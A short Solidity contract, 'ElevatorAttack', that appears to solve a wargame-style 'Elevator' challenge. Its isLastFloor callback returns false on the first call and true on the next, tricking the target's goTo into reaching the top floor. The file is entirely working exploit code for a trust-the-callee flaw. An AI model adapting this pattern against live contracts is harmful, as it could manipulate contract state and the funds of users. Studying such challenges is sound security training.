pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256) external;
}

contract ElevatorAttack {
    address private elevatorInstance;
    bool private firstCall = true;

    constructor(address _elevatorInstance) {
        elevatorInstance = _elevatorInstance;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        }
        return true;
    }

    function attack() external {
        IElevator(elevatorInstance).goTo(1337);
    }
} 
